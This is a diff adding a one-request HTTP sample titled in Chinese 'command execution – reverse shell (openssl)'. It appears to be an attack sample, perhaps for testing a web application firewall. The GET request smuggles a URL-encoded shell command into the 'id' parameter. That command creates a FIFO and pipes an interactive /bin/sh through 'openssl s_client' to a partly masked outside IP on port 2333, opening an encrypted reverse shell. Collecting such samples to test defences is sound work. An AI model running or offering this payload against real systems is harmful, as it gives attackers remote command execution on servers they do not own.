@@ -1,0 +1,9 @@
+# 命令执行_反弹shell-06507072
+# openssl反弹shell
+GET /?id=mkfifo%20%2Ftmp%2Fs%3B%20%2Fbin%2Fsh%20-i%20%3C%20%2Ftmp%2Fs%202%3E&1%20%7C%20openssl%20s_client%20-quiet%20-connect%2047.xxx.xxx.72:2333%20%3E%20%2Ftmp%2Fs%3B%20rm%20%2Ftmp%2Fs&bid=hd_tag_m8mv25yk HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25yk
+RM-PRO-Token: 466a4c342bf44e93c3969d086596b679
+RM-PRO-Time: 1742808514249
+User-Agent: curl/7.83.1
+
